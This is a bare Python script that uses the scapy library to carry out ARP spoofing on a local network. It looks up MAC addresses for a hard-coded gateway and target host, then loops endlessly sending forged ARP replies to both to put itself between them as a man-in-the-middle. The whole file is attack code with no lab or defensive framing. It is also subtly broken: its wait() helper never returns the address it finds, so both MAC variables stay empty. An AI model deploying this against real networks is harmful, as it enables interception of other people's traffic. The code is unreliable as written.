import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
 spoofed_arp_packet = scapy.ARP(pdst=target_ip,hwdst=target_mac, psrc=spoof_ip, op="is-at")
 scapy.send(spoofed_arp_packet, verbose = 0)

def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip)
    reply, something= scapy.srp(arp_request,timeout = 3, verbose = 0)
    if reply:
       return reply [0][1].src
    return None

def wait(ip):
   mac = None
   while not mac:
      mac = get_mac(ip)
      if not mac:
         print("mac addres for{} target not found \n".format(ip))


gateway_ip = "192.168.1.1"
target_ip = "192.168.1.33"

target_mac= wait(target_ip)
gateway_mac=wait(gateway_ip)
print("target mac addres is:{}".format(target_mac))

while True:
   spoof(target_ip=target_ip, target_mac=target_mac,spoof_ip=gateway_ip)
   spoof(target_ip=gateway_ip,target_mac=gateway_mac, spoof_ip=target_ip)
   print("spoofing is active")